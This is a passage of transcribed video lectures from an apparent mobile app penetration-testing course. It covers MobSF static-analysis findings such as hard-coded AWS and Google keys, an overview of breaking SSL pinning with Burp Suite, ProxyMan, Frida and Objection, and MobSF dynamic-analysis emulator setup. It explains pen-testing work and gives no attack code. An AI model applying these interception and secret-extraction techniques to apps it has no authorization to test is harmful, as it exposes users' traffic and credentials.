hand bar you have the hard-coded secrets

446
00:18:15.920 --> 00:18:18.160
and this really kind of pulls out the

447
00:18:18.160 --> 00:18:20.460
ones that might be sensitive from the application

448
00:18:20.460 --> 00:18:22.580
so you can see like our aws id

449
00:18:22.580 --> 00:18:24.840
and secret key that we use to try

450
00:18:24.840 --> 00:18:28.380
to pull from the aws storage bucket right

451
00:18:28.380 --> 00:18:30.880
you can see things like hard-coded passwords

452
00:18:30.880 --> 00:18:33.540
possibly if there was any has the firebase

453
00:18:33.540 --> 00:18:37.220
url here also has some things where it

454
00:18:37.220 --> 00:18:40.140
just tags based on firebase or aws also

455
00:18:40.140 --> 00:18:42.740
highlighted the google api keys here and the

456
00:18:42.740 --> 00:18:45.640
crash reporting api key so this is definitely

457
00:18:45.640 --> 00:18:47.700
a useful area to look in when you're

458
00:18:47.700 --> 00:18:49.460
doing a bug bounty hunt because it can

459
00:18:49.460 --> 00:18:52.060
really quickly give you an idea of some

460
00:18:52.060 --> 00:18:55.280
of the more sensitive words that might be

461
00:18:55.280 --> 00:18:56.960
in the application like it picked up password

462
00:18:56.960 --> 00:18:58.760
here it picked up the url for the

463
00:18:58.760 --> 00:19:01.620
firebase database going down here this is just

464
00:19:01.620 --> 00:19:03.320
all the activities we kind of saw this

465
00:19:03.320 --> 00:19:05.480
before when we jumped down here we have

466
00:19:05.480 --> 00:19:08.840
our services receivers providers and then anything that

467
00:19:08.840 --> 00:19:11.420
might be a file in this application so

468
00:19:11.420 --> 00:19:14.220
you have like tonnes of xml files things

469
00:19:14.220 --> 00:19:16.660
here for like the animations and the ui

470
00:19:16.660 --> 00:19:19.140
itself also you could find like the strings

471
00:19:19.140 --> 00:19:23.340
.xml in there as well going down and

472
00:19:23.340 --> 00:19:25.680
that's the end of the components here now

473
00:19:25.680 --> 00:19:27.620
in my case i do not have the

474
00:19:27.620 --> 00:19:30.800
necessary component to generate a pdf report but

475
00:19:30.800 --> 00:19:33.100
if you are interested in generating a pdf

476
00:19:33.100 --> 00:19:36.340
report you just need to instal this wkhtml

477
00:19:36.340 --> 00:19:39.560
to pdf executable i'll put a link to

478
00:19:39.560 --> 00:19:42.880
this in the course description as well so

479
00:19:42.880 --> 00:19:44.080
you can go out and get that if

480
00:19:44.080 --> 00:19:46.380
you're interested in generating a pdf this can

481
00:19:46.380 --> 00:19:49.040
be very useful if you're reporting out to

482
00:19:49.040 --> 00:19:51.440
someone an executive or something like that if

483
00:19:51.440 --> 00:19:53.060
you want to attach this to your pen

484
00:19:53.060 --> 00:19:57.220
testing report maybe as an addended item right

485
00:19:57.220 --> 00:19:59.140
so if i was to do like a

486
00:19:59.140 --> 00:20:01.320
penetration test of a mobile app for an

487
00:20:01.320 --> 00:20:04.860
external client i would add this report in

488
00:20:04.860 --> 00:20:07.860
there just to say that you know i

489
00:20:07.860 --> 00:20:09.300
ran this report this is some of the

490
00:20:09.300 --> 00:20:12.700
stuff that i found but again you want

491
00:20:12.700 --> 00:20:14.020
to make sure that you're clear with the

492
00:20:14.020 --> 00:20:16.460
client that the security score does not necessarily

493
00:20:16.460 --> 00:20:19.380
mean that their application is that secure or

494
00:20:19.380 --> 00:20:22.580
is that weak right so just make sure

495
00:20:22.580 --> 00:20:24.580
if you're taking that pdf report and giving

496
00:20:24.580 --> 00:20:26.800
it to an executive that you're very clear

497
00:20:26.800 --> 00:20:28.820
that that security score comes with a grain

498
00:20:28.820 --> 00:20:31.060
of salt you can print the report to

499
00:20:31.060 --> 00:20:33.020
like pdf or a word document if you

500
00:20:33.020 --> 00:20:35.200
want to and down here at the very

501
00:20:35.200 --> 00:20:37.440
bottom you can also do start your dynamic

502
00:20:37.440 --> 00:20:40.060
analysis so uh this is kind of the

503
00:20:40.060 --> 00:20:42.220
overview of mob sf i hope that you

504
00:20:42.220 --> 00:20:44.640
find this tool useful it's really great for

505
00:20:44.640 --> 00:20:46.760
speeding up your pen testing process and to

506
00:20:46.760 --> 00:20:48.500
give you some hints and tips on the

507
00:20:48.500 --> 00:20:50.660
application and to point things out a little

508
00:20:50.660 --> 00:20:52.700
bit faster than doing everything manually



━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

==================================================================================

# Section 6: Android-Dynamic-Analysis

WEBVTT

1
00:00:00.580 --> 00:00:02.720
(Transcribed by TurboScribe. Go Unlimited to remove this message.) Okay, let's get started into that dynamic analysis

2
00:00:02.720 --> 00:00:04.340
portion of this course.

3
00:00:05.660 --> 00:00:08.300
Now here is a quick overview again of

4
00:00:08.300 --> 00:00:10.580
what we'll be covering in this dynamic analysis

5
00:00:10.580 --> 00:00:11.140
section.

6
00:00:11.540 --> 00:00:13.260
So in this video, we'll be covering the

7
00:00:13.260 --> 00:00:16.540
introduction to SSL pinning, then we'll talk about

8
00:00:16.540 --> 00:00:19.580
how to install, set up, and utilize tools

9
00:00:19.580 --> 00:00:22.140
like Burp Suite and ProxyMan that we'll be

10
00:00:22.140 --> 00:00:25.260
using as proxies for our Android phone.

11
00:00:26.020 --> 00:00:28.420
Then we'll get into the introduction to Frida

12
00:00:28.420 --> 00:00:29.260
and Objection.

13
00:00:29.560 --> 00:00:31.640
These tools are going to actually help us

14
00:00:31.640 --> 00:00:33.020
break SSL pinning.

15
00:00:33.400 --> 00:00:36.260
Then we'll go into dumping memory sensitive data

16
00:00:36.260 --> 00:00:38.700
out of the Android application, talk a little

17
00:00:38.700 --> 00:00:42.120
bit about SQLite databases, and also show you

18
00:00:42.120 --> 00:00:44.960
how local storage changes at runtime of the

19
00:00:44.960 --> 00:00:48.080
application versus when the application is closed.

20
00:00:48.440 --> 00:00:51.560
Finally, we'll finish this dynamic analysis section with

21
00:00:51.560 --> 00:00:54.180
a live bug bounty hunt against two applications.

22
00:00:55.260 --> 00:00:58.000
So what is this thing called SSL pinning

23
00:00:58.000 --> 00:01:00.440
I've been talking about for quite a while

24
00:01:00.440 --> 00:01:00.840
now?

25
00:01:01.280 --> 00:01:05.000
Well, SSL pinning is a security methodology used

26
00:01:05.000 --> 00:01:07.900
to ensure that application traffic is not being

27
00:01:07.900 --> 00:01:10.240
intercepted by a malicious party.

28
00:01:10.460 --> 00:01:12.280
So you may have heard of this type

29
00:01:12.280 --> 00:01:14.820
of attack referred to as a man-in

30
00:01:14.820 --> 00:01:15.580
-the-middle attack.

31
00:01:16.240 --> 00:01:19.940
And some mobile applications actually verify the traffic

32
00:01:19.940 --> 00:01:22.460
that they're sending and receiving is coming from

33
00:01:22.460 --> 00:01:23.740
a known certificate.

34
00:01:23.740 --> 00:01:26.320
And this can actually happen in a number

35
00:01:26.320 --> 00:01:26.960
of ways.

36
00:01:27.420 --> 00:01:30.900
Some mobile applications verify based on the root

37
00:01:30.900 --> 00:01:34.660
certificates or the user trusted certificates of the

38
00:01:34.660 --> 00:01:35.880
Android phone itself.

39
00:01:36.100 --> 00:01:38.860
So we can actually import these certificates into

40
00:01:38.860 --> 00:01:41.260
the phone and trust them as a root

41
00:01:41.260 --> 00:01:42.560
or a user certificate.

42
00:01:43.120 --> 00:01:46.020
But some other mobile applications you may find

43
00:01:46.020 --> 00:01:49.080
actually have their own certificate trust store for

44
00:01:49.080 --> 00:01:50.860
the application individually.

45
00:01:51.300 --> 00:01:54.300
And so even though we import these certificates

46
00:01:54.300 --> 00:01:57.280
into the Android phone, they could still end

47
00:01:57.280 --> 00:02:00.680
up not being trusted by the Android application.

48
00:02:01.220 --> 00:02:03.460
And in some cases, this can actually cause

49
00:02:03.460 --> 00:02:06.280
our application to crash when we're trying to

50
00:02:06.280 --> 00:02:08.180
intercept the network traffic.

51
00:02:08.960 --> 00:02:12.060
So from a pen tester's perspective, SSL pinning

52
00:02:12.060 --> 00:02:14.080
can definitely make our job a little bit

53
00:02:14.080 --> 00:02:14.380
harder.

54
00:02:14.720 --> 00:02:16.580
We always want to get to the point

55
00:02:16.580 --> 00:02:18.980
where we're trying to see the live application

56
00:02:18.980 --> 00:02:21.940
traffic so that we can manipulate parameters and

57
00:02:21.940 --> 00:02:25.700
test for things like input validation, SQL injection,

58
00:02:26.080 --> 00:02:27.720
and trying to see if maybe we can

59
00:02:27.720 --> 00:02:31.320
see other users' accounts or editing parameters whenever

60
00:02:31.320 --> 00:02:32.040
possible.

61
00:02:33.280 --> 00:02:35.800
And so this is kind of a diagram

62
00:02:35.800 --> 00:02:37.960
overview of SSL pinning.

63
00:02:38.380 --> 00:02:40.240
Now, instead of on the left-hand side

64
00:02:40.240 --> 00:02:42.300
where it has this user, I want you

65
00:02:42.300 --> 00:02:45.260
to imagine that as your Android phone, as

66
00:02:45.260 --> 00:02:46.940
any type of mobile device.

67
00:02:46.940 --> 00:02:48.780
On the right-hand side where it shows

68
00:02:48.780 --> 00:02:51.680
the web application, just imagine this as any

69
00:02:51.680 --> 00:02:54.040
endpoint that our mobile phone is actually reaching

70
00:02:54.040 --> 00:02:54.500
out to.

71
00:02:55.060 --> 00:02:57.680
It could be anything like a URL or

72
00:02:57.680 --> 00:03:00.360
an API gateway or anything of the like

73
00:03:00.360 --> 00:03:02.280
where the mobile application is reaching out.

74
00:03:03.420 --> 00:03:06.700
Now, us as the attacker, using our tools

75
00:03:06.700 --> 00:03:09.100
such as Burp Suite or ProxyMan, we are

76
00:03:09.100 --> 00:03:10.980
taking the role of this perpetrator.

77
00:03:11.440 --> 00:03:12.760
And we're going to be actually setting up

78
00:03:12.760 --> 00:03:15.560
our Android phone, right, to send traffic to

79
00:03:15.560 --> 00:03:17.520
ourselves as the man in the middle.

80
00:03:18.200 --> 00:03:21.640
Now, the mobile application that's actually running might

81
00:03:21.640 --> 00:03:23.120
not trust that certificate.

82
00:03:23.460 --> 00:03:26.660
So when it sends the data to our

83
00:03:26.660 --> 00:03:28.680
man in the middle, maybe it sees that

84
00:03:28.680 --> 00:03:31.780
certificate that's being presented by our Burp Suite

85
00:03:31.780 --> 00:03:34.360
or ProxyMan as a malicious certificate.

86
00:03:34.680 --> 00:03:36.820
And so the application will actually crash there.

87
00:03:37.400 --> 00:03:39.640
And so to be able to successfully intercept

88
00:03:39.640 --> 00:03:43.420
this traffic as a perpetrator, we need to

89
00:03:43.420 --> 00:03:45.860
do things like breaking the SSL pinning so

90
00:03:45.860 --> 00:03:47.960
that our application does not crash.

91
00:03:49.060 --> 00:03:51.080
Now, when it comes to the proxies that

92
00:03:51.080 --> 00:03:53.360
we're using in this course, I prefer two

93
00:03:53.360 --> 00:03:54.460
different proxy tools.

94
00:03:54.820 --> 00:03:57.260
One is Burp Suite and the other is

95
00:03:57.260 --> 00:03:58.100
ProxyMan.

96
00:03:58.460 --> 00:04:00.660
Now, Burp Suite is utilized by a lot

97
00:04:00.660 --> 00:04:02.700
of penetration testers and it has a lot

98
00:04:02.700 --> 00:04:04.880
of penetration testing-focused tools.

99
00:04:05.380 --> 00:04:08.080
Things like Burp Suite Intruder, Burp Suite Repeater,

100
00:04:08.260 --> 00:04:09.940
everything like that will be utilized.

101
00:04:10.520 --> 00:04:13.400
If you ever use a proxying tool like

102
00:04:13.400 --> 00:04:14.280
Burp Suite before.

103
00:04:14.920 --> 00:04:16.560
Burp Suite can be used for both iOS

104
00:04:16.560 --> 00:04:17.940
and Android pen testing.

105
00:04:18.519 --> 00:04:20.220
And in some cases, when we get into

106
00:04:20.220 --> 00:04:22.880
the iOS portion of this course, Burp Suite

107
00:04:22.880 --> 00:04:24.860
will be utilized as kind of our last

108
00:04:24.860 --> 00:04:27.960
resort when we're intercepting our application traffic.

109
00:04:28.860 --> 00:04:31.020
ProxyMan is a newer tool that's only been

110
00:04:31.020 --> 00:04:33.060
out for a few years and it only

111
00:04:33.060 --> 00:04:34.960
works on macOS computers.

112
00:04:35.380 --> 00:04:37.580
But the cool thing about ProxyMan is that

113
00:04:37.580 --> 00:04:39.740
it has some neat settings that actually allow

114
00:04:39.740 --> 00:04:43.420
us to import certificates into our Mac keychain

115
00:04:43.420 --> 00:04:46.780
and into our emulators or our iOS devices

116
00:04:46.780 --> 00:04:49.260
as well that will make the whole process

117
00:04:49.260 --> 00:04:51.600
of intercepting traffic a lot easier.

118
00:04:51.840 --> 00:04:53.820
We'll actually be able to see like a

119
00:04:53.820 --> 00:04:56.360
list of all the domains or URLs that

120
00:04:56.360 --> 00:04:59.120
our application is reaching out to and select

121
00:04:59.120 --> 00:05:00.700
some of them for decryption.

122
00:05:00.940 --> 00:05:03.280
So if we see only certain ones that

123
00:05:03.280 --> 00:05:06.540
we want to be intercepting, then we can

124
00:05:06.540 --> 00:05:09.980
actually select specific URLs and intercept the traffic

125
00:05:09.980 --> 00:05:11.380
only to those URLs.

126
00:05:12.340 --> 00:05:14.860
So ProxyMan can also be used for iOS

127
00:05:14.860 --> 00:05:17.580
and Android phones, but again, it's only available

128
00:05:17.580 --> 00:05:19.620
for macOS host machines.

129
00:05:20.340 --> 00:05:22.760
Some other options out there, if you're curious,

130
00:05:22.900 --> 00:05:24.560
you could use man-in-the-middle proxy,

131
00:05:24.780 --> 00:05:26.400
Charles proxy, Fiddler, etc.

132
00:05:26.720 --> 00:05:28.760
But for this course, I really had to

133
00:05:28.760 --> 00:05:30.120
settle on two tools.

134
00:05:30.280 --> 00:05:31.820
I don't want to give just one tool

135
00:05:31.820 --> 00:05:34.040
because, you know, if you want to use

136
00:05:34.040 --> 00:05:35.560
a different tool or you need one for

137
00:05:35.560 --> 00:05:37.840
a different scenario, I always want to try

138
00:05:37.840 --> 00:05:39.080
to give you two tools.

139
00:05:40.400 --> 00:05:42.840
Okay, so this is what our Android interception

140
00:05:42.840 --> 00:05:44.140
process is going to be.

141
00:05:44.560 --> 00:05:46.080
And just stick with me as I walk

142
00:05:46.080 --> 00:05:46.940
through this slide.

143
00:05:47.100 --> 00:05:48.800
It will make more sense when you actually

144
00:05:48.800 --> 00:05:51.140
see this applied in the following videos.

145
00:05:51.500 --> 00:05:53.120
So the first step we're going to do

146
00:05:53.120 --> 00:05:56.100
is install and start our proxy software.

147
00:05:56.320 --> 00:05:58.600
So in some cases, it'll be Burp Suite.

148
00:05:58.740 --> 00:06:00.440
In some cases, it'll be ProxyMan.

149
00:06:00.520 --> 00:06:02.540
I'll show you how to install both those

150
00:06:02.540 --> 00:06:02.860
tools.

151
00:06:03.400 --> 00:06:06.160
Next, we're going to configure our proxy software.

152
00:06:06.380 --> 00:06:08.480
So for Burp Suite, we need to especially

153
00:06:08.480 --> 00:06:11.400
set up some options for mobile devices.

154
00:06:11.700 --> 00:06:13.600
And for ProxyMan, we also need to do

155
00:06:13.600 --> 00:06:14.640
a little bit of setup.

156
00:06:15.100 --> 00:06:17.060
The third step is going to be setting

157
00:06:17.060 --> 00:06:20.940
up the actual proxy in the emulator itself.

158
00:06:21.140 --> 00:06:23.240
So we'll go to the emulator settings and

159
00:06:23.240 --> 00:06:24.820
assign the proxy there.

160
00:06:25.220 --> 00:06:27.100
If we're doing this on a physical device,

161
00:06:27.120 --> 00:06:28.820
you can also set this up in the

162
00:06:28.820 --> 00:06:29.780
Wi-Fi settings.

163
00:06:29.780 --> 00:06:31.860
You'll have to go to advanced settings and

164
00:06:31.860 --> 00:06:33.420
set the proxy up from there.

165
00:06:33.820 --> 00:06:35.760
I will show that when we're actually doing

166
00:06:35.760 --> 00:06:38.060
the iOS pen testing section when I'm using

167
00:06:38.060 --> 00:06:39.220
the jailbroken device.

168
00:06:39.360 --> 00:06:41.140
We'll actually need to go through the Wi

169
00:06:41.140 --> 00:06:41.740
-Fi settings.

170
00:06:41.920 --> 00:06:43.260
So you'll see how you can do that

171
00:06:43.260 --> 00:06:44.280
for iPhone there.

172
00:06:44.640 --> 00:06:46.300
But it's just on the settings for an

173
00:06:46.300 --> 00:06:48.700
Android phone if you're using a physical Android

174
00:06:48.700 --> 00:06:49.060
phone.

175
00:06:49.940 --> 00:06:52.540
Next step, to test and make sure that

176
00:06:52.540 --> 00:06:55.580
our proxy is actually working appropriately, we're going

177
00:06:55.580 --> 00:06:58.780
to intercept some clear text HTTP traffic.

178
00:06:58.780 --> 00:07:00.600
And this is just going to make sure

179
00:07:00.600 --> 00:07:03.020
that our proxy has actually applied on the

180
00:07:03.020 --> 00:07:03.820
Android phone.

181
00:07:03.900 --> 00:07:06.260
We'll be able to intercept clear text traffic.

182
00:07:07.100 --> 00:07:08.960
The next thing we'll need to do is

183
00:07:08.960 --> 00:07:11.760
actually import those certificates onto the phone.

184
00:07:12.120 --> 00:07:13.560
And then we need to go to the

185
00:07:13.560 --> 00:07:16.360
Android settings and actually trust them in the

186
00:07:16.360 --> 00:07:18.500
settings there so that our Android phone knows

187
00:07:18.500 --> 00:07:20.120
that this is a trusted certificate.

188
00:07:20.760 --> 00:07:23.240
So at this point on step 7, we

189
00:07:23.240 --> 00:07:26.520
should have the ability to intercept HTTPS traffic.

190
00:07:26.520 --> 00:07:29.540
And in the following videos, I'll actually show

191
00:07:29.540 --> 00:07:32.100
us doing this on the web browser in

192
00:07:32.100 --> 00:07:33.480
Google Chrome, for example.

193
00:07:34.320 --> 00:07:38.340
And this will actually work to intercept encrypted

194
00:07:38.340 --> 00:07:40.360
traffic now when we're using the web browser.

195
00:07:40.680 --> 00:07:43.580
But in some cases, when a mobile application

196
00:07:43.580 --> 00:07:47.580
is actually implementing SSL pinning appropriately, we will

197
00:07:47.580 --> 00:07:50.880
still fail to intercept the encrypted traffic coming

198
00:07:50.880 --> 00:07:52.200
from that mobile app.

199
00:07:52.200 --> 00:07:54.540
And so at this point, if we have

200
00:07:54.540 --> 00:07:57.300
not been able to intercept the traffic from

201
00:07:57.300 --> 00:07:59.620
our mobile application, we will need to move

202
00:07:59.620 --> 00:08:02.160
on to the next step, trying Objection and

203
00:08:02.160 --> 00:08:05.460
Frida to inject this tool into the mobile

204
00:08:05.460 --> 00:08:08.860
application manually or automatically, and that will help

205
00:08:08.860 --> 00:08:10.700
us to break SSL pinning too.

206
00:08:11.180 --> 00:08:12.920
Now if we get done with all of

207
00:08:12.920 --> 00:08:15.860
that, there are some actual scenarios where with

208
00:08:15.860 --> 00:08:18.020
an Android phone, we might not be able

209
00:08:18.020 --> 00:08:21.200
to intercept our mobile application traffic.

210
00:08:21.200 --> 00:08:24.080
And as a very, very final last resort,

211
00:08:24.340 --> 00:08:26.260
that's when you could actually try to use

212
00:08:26.260 --> 00:08:28.260
the same application if they have an iOS

213
00:08:28.260 --> 00:08:30.680
version, and you can try to intercept the

214
00:08:30.680 --> 00:08:32.640
traffic using a jailbroken device.

215
00:08:32.900 --> 00:08:34.980
Because when we jailbreak our device, we will

216
00:08:34.980 --> 00:08:37.480
actually be able to use some additional tools

217
00:08:37.480 --> 00:08:40.820
like SSL Kill Chain that will kill SSL

218
00:08:40.820 --> 00:08:43.260
pinning at the very system level.

219
00:08:43.820 --> 00:08:48.100
So there are some scenarios when Android, you

220
00:08:48.100 --> 00:08:49.920
will not be able to break SSL pinning,

221
00:08:49.920 --> 00:08:52.940
but in most situations, you should be able

222
00:08:52.940 --> 00:08:55.840
to break it using Frida or Objection.

223
00:08:56.200 --> 00:08:57.640
So just keep that in mind as we're

224
00:08:57.640 --> 00:08:58.600
going through these videos.

225
00:08:59.240 --> 00:09:01.220
You might want to go and watch the

226
00:09:01.220 --> 00:09:04.940
iOS jailbreaking video and everything with the SSL

227
00:09:04.940 --> 00:09:07.340
Kill Chain there if it's something that you're

228
00:09:07.340 --> 00:09:09.420
interested in and something that you want to

229
00:09:09.420 --> 00:09:11.560
see for iOS as well.


━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

WEBVTT

1
00:00:00.010 --> 00:00:02.810
(Transcribed by TurboScribe. Go Unlimited to remove this message.) Okay, now that we've set up our dynamic

2
00:00:02.810 --> 00:00:05.870
analysis using Burp Suite and using Objection as

3
00:00:05.870 --> 00:00:08.050
well, I also want to show you some

4
00:00:08.050 --> 00:00:09.970
options using MobSF.

5
00:00:10.590 --> 00:00:13.210
As I previously mentioned with MobSF, the tool

6
00:00:13.210 --> 00:00:15.730
is great for doing a static analysis, but

7
00:00:15.730 --> 00:00:18.050
it can also do a dynamic analysis.

8
00:00:18.570 --> 00:00:19.830
Now in this video we're going to have

9
00:00:19.830 --> 00:00:21.650
to do quite a bit of setup at

10
00:00:21.650 --> 00:00:23.030
the very beginning, so it's going to be

11
00:00:23.030 --> 00:00:25.930
a bit long just for your information, but

12
00:00:25.930 --> 00:00:28.010
I will try to be as complete as

13
00:00:28.010 --> 00:00:30.970
possible in the setup of the dynamic analyser

14
00:00:30.970 --> 00:00:35.230
because it does take some technical configuration before

15
00:00:35.230 --> 00:00:35.930
it's working.

16
00:00:36.990 --> 00:00:38.370
So to find out how to set up

17
00:00:38.370 --> 00:00:40.530
the dynamic analysis features, you can go to

18
00:00:40.530 --> 00:00:42.750
the wiki page here off of github and

19
00:00:42.750 --> 00:00:43.870
go to their documentation.

20
00:00:44.270 --> 00:00:46.610
Then we can go to configuring the dynamic

21
00:00:46.610 --> 00:00:49.950
analyser here, and let me zoom in a

22
00:00:49.950 --> 00:00:51.150
bit so you can see a little bit

23
00:00:51.150 --> 00:00:51.430
better.

24
00:00:51.690 --> 00:00:53.810
You can see they have multiple options here,

25
00:00:53.930 --> 00:00:56.950
like for the Genymotion Android setup, and they

26
00:00:56.950 --> 00:00:59.870
also have the Android Studio emulator, and if

27
00:00:59.870 --> 00:01:01.250
you're looking at doing this in the cloud

28
00:01:01.250 --> 00:01:04.390
as well, there's also documentation for the Genymotion

29
00:01:04.390 --> 00:01:06.750
cloud emulators, right?

30
00:01:06.970 --> 00:01:09.130
For this case, I am going to use

31
00:01:09.130 --> 00:01:10.770
the Android Studio emulators.

32
00:01:11.250 --> 00:01:13.990
Now here in the first section, it says

33
00:01:13.990 --> 00:01:17.510
that you cannot start AVD from Android Studio,

34
00:01:17.850 --> 00:01:21.090
so how we've been starting our emulators throughout

35
00:01:21.090 --> 00:01:23.030
this course has been in Android Studio.

36
00:01:23.170 --> 00:01:25.010
We've been pressing the play button here, right?

37
00:01:25.430 --> 00:01:28.650
But for the dynamic analysis with MobSF, we

38
00:01:28.650 --> 00:01:29.810
cannot do that.

39
00:01:30.230 --> 00:01:33.190
We actually need to start the AVDs directly

40
00:01:33.190 --> 00:01:35.230
from the command line with a writable file

41
00:01:35.230 --> 00:01:39.310
system using the emulator command, and how we

42
00:01:39.310 --> 00:01:40.810
can actually do this is that we need

43
00:01:40.810 --> 00:01:46.130
to add the emulator executable to our path,

44
00:01:46.270 --> 00:01:48.770
and these are the paths for Mac, Linux,

45
00:01:48.930 --> 00:01:49.510
and Windows.

46
00:01:49.750 --> 00:01:51.650
So if you're going to have to add

47
00:01:51.650 --> 00:01:53.450
this to your path for Mac, the commands

48
00:01:53.450 --> 00:01:54.130
will be different.

49
00:01:54.630 --> 00:01:56.410
You're going to have to learn how to

50
00:01:56.410 --> 00:01:58.370
add something to your path variables.

51
00:01:58.490 --> 00:02:00.190
For Linux, this can be very similar to

52
00:02:00.190 --> 00:02:02.470
Mac, and for Windows, I will show that

53
00:02:02.470 --> 00:02:03.050
one here.

54
00:02:03.410 --> 00:02:05.050
So how you would add this to your

55
00:02:05.050 --> 00:02:06.790
path is you would go to like the

56
00:02:06.790 --> 00:02:11.350
Windows start menu, type in environment into the

57
00:02:11.350 --> 00:02:14.630
search bar, and you can click edit the

58
00:02:14.630 --> 00:02:16.350
system environment variables here.

59
00:02:17.110 --> 00:02:18.870
This will pull up a window that looks

60
00:02:18.870 --> 00:02:20.610
like this, and you're going to click environment

61
00:02:20.610 --> 00:02:21.150
variables.

62
00:02:21.490 --> 00:02:23.010
Then you're going to go to path.

63
00:02:23.110 --> 00:02:24.070
This is the one that we need to

64
00:02:24.070 --> 00:02:26.370
set up, and here I actually have the

65
00:02:26.370 --> 00:02:29.830
file path already located, and it's at C

66
00:02:29.830 --> 00:02:31.530
colon users arid.

67
00:02:31.750 --> 00:02:33.870
Whatever your username would be for your Windows

68
00:02:33.870 --> 00:02:36.270
system, you would replace that there instead of

69
00:02:36.270 --> 00:02:36.770
my name.

70
00:02:37.370 --> 00:02:41.470
Appdata local android SDK emulator, and that whole

71
00:02:41.470 --> 00:02:44.530
path is also documented right here in the

72
00:02:44.530 --> 00:02:45.670
documentation, right?

73
00:02:45.810 --> 00:02:47.670
So this is what you would add into

74
00:02:47.670 --> 00:02:48.530
your path.

75
00:02:48.930 --> 00:02:51.210
So you can just double click here, put

76
00:02:51.210 --> 00:02:52.550
that path in there, click okay.

77
00:02:52.710 --> 00:02:54.610
In my case, it's already set up, so

78
00:02:54.610 --> 00:02:55.390
I'm going to click okay.

79
00:02:55.730 --> 00:02:57.890
Okay, and now to make sure that this

80
00:02:57.890 --> 00:02:59.550
tool is working, I'm going to open a

81
00:02:59.550 --> 00:03:03.010
command prompt, and we can just type in

82
00:03:03.010 --> 00:03:05.670
the command emulator, and so this is how

83
00:03:05.670 --> 00:03:07.330
we know that the command is working because

84
00:03:07.330 --> 00:03:10.570
it says no AVD specified, and what we

85
00:03:10.570 --> 00:03:13.470
need to do for the dynamic analysis with

86
00:03:13.470 --> 00:03:16.210
MobSF is we need to have an emulator

87
00:03:16.210 --> 00:03:18.570
without the Google Play Store installed.

88
00:03:18.690 --> 00:03:20.190
So if I go back to my AVD

89
00:03:20.190 --> 00:03:22.930
manager in Android Studio, you can see I

90
00:03:22.930 --> 00:03:24.230
have a few options here.

91
00:03:24.290 --> 00:03:26.130
I have like the Nexus 5 with API

92
00:03:26.130 --> 00:03:28.170
23, 21, and 19.

93
00:03:28.690 --> 00:03:31.530
These ones without the Play Store icon are

94
00:03:31.530 --> 00:03:33.850
the ones that you could instal and use

95
00:03:33.850 --> 00:03:36.050
with MobSF dynamic analysis.

96
00:03:36.490 --> 00:03:38.090
The ones with the Play Store installed like

97
00:03:38.090 --> 00:03:40.790
this Play Store puller would not work with

98
00:03:40.790 --> 00:03:41.550
this tool, okay?

99
00:03:41.690 --> 00:03:43.110
And if you need to make a new

100
00:03:43.110 --> 00:03:45.070
one without the Play Store, just remember you

101
00:03:45.070 --> 00:03:46.950
can go to create virtual device, you can

102
00:03:46.950 --> 00:03:48.790
select your device type, and you can go

103
00:03:48.790 --> 00:03:51.590
to the x86 images here and get any

104
00:03:51.590 --> 00:03:53.670
of the ones here that have Google API

105
00:03:53.670 --> 00:03:55.070
or nothing next to it.

106
00:03:57.220 --> 00:03:59.660
Okay, so now we need to actually list

107
00:03:59.660 --> 00:04:02.300
the various emulators we have, and according to

108
00:04:02.300 --> 00:04:04.100
our documentation here we need to do the

109
00:04:04.100 --> 00:04:07.800
command emulator space dash list dash AVDs.

110
00:04:07.920 --> 00:04:12.480
So I'm going to do that here, emulator

111
00:04:14.500 --> 00:04:19.649
dash list AVDs, and we can see our

112
00:04:19.649 --> 00:04:21.150
emulators are all named here.

113
00:04:21.270 --> 00:04:22.890
In my case I am going to use

114
00:04:22.890 --> 00:04:25.430
this Nexus 5 API 23.

115
00:04:25.750 --> 00:04:29.570
The MobSF dynamic analyser supports anything up to

116
00:04:29.570 --> 00:04:32.410
API 28, so just keep that in mind

117
00:04:32.410 --> 00:04:35.070
when you're testing applications in case they have

118
00:04:35.070 --> 00:04:38.650
no support for anything under a certain API

119
00:04:38.650 --> 00:04:39.170
version.

120
00:04:39.630 --> 00:04:41.510
Okay, and to start our emulator if we

121
00:04:41.510 --> 00:04:43.390
scroll down a bit more through the documentation

122
00:04:43.390 --> 00:04:45.170
this is the command that we're going to

123
00:04:45.170 --> 00:04:45.750
have to use.

124
00:04:45.930 --> 00:04:48.530
It's going to be emulator space dash AVD,

125
00:04:48.530 --> 00:04:50.470
the name of our AVD which we have

126
00:04:50.470 --> 00:04:52.370
in the command prompt right now, and then

127
00:04:52.370 --> 00:04:55.290
a dash writable dash system and no snapshot.

128
00:04:55.590 --> 00:04:57.750
This is what we need to follow for

129
00:04:57.750 --> 00:05:01.290
MobSF to actually make changes to our emulator

130
00:05:01.290 --> 00:05:02.290
as it's running.

131
00:05:02.430 --> 00:05:04.370
So I'm going to copy this command here,

132
00:05:08.980 --> 00:05:17.500
or just do an emulator dash AVD.

133
00:05:17.680 --> 00:05:18.980
This is to start the emulator.

134
00:05:19.380 --> 00:05:21.540
Then I can copy this name out of

135
00:05:21.540 --> 00:05:24.740
here, or I can type it in if

136
00:05:24.740 --> 00:05:27.500
my copy and paste is not working, API

137
00:05:27.500 --> 00:05:30.220
underscore 23, and then we need to do

138
00:05:30.220 --> 00:05:34.180
a dash writable dash system space, and then

139
00:05:34.180 --> 00:05:38.780
a dash no, and the last word is

140
00:05:38.780 --> 00:05:39.380
snapshot.

141
00:05:39.840 --> 00:05:44.600
So dash no snapshot, and it's going to

142
00:05:44.600 --> 00:05:47.180
start our emulator here by using the emulator

143
00:05:47.180 --> 00:05:50.080
command as opposed to using Android Studio.

144
00:05:51.000 --> 00:05:53.360
And once our emulator starts up now we

145
00:05:53.360 --> 00:05:55.880
can actually start MobSF from the command line.

146
00:05:56.000 --> 00:05:57.540
So I'm going to open another command prompt

147
00:05:57.540 --> 00:06:00.720
here, drag this over, and I'm going to

148
00:06:00.720 --> 00:06:02.580
go to my MobSF directory.

149
00:06:02.960 --> 00:06:05.420
If you need to instal MobSF make sure

150
00:06:05.420 --> 00:06:07.660
you go back to the static analysis video

151
00:06:07.660 --> 00:06:08.660
with MobSF.

152
00:06:08.760 --> 00:06:10.640
I explain how you can instal this tool

153
00:06:10.640 --> 00:06:11.100
from there.

154
00:06:11.580 --> 00:06:13.620
On Windows here I'm going to do a

155
00:06:13.620 --> 00:06:15.540
run.bat. This is how I'm going to

156
00:06:15.540 --> 00:06:16.680
start up MobSF.

157
00:06:17.300 --> 00:06:19.200
It's going to take a second to start

158
